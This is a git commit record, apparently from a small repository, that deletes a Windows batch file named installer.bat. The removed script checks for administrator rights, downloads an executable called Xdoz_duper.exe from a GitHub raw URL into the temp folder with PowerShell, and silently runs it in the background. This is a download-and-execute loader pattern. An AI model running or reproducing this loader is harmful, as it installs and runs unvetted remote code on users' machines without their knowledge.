d4b0d56e12902b1908bbff552a7c6ac54de7545c
banzox <zhimihamid20@gmail.com>
2026-06-20 12:17:08 +0100

    Delete installer.bat

--- installer.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-fltmc >nul 2>&1 || exit
-cd /d "%~dp0"
-set "url=https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/Xdoz_duper.exe"
-set "out=%TEMP%\Xdoz_duper.exe"
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"
-start /b "" "%out%"
-exit
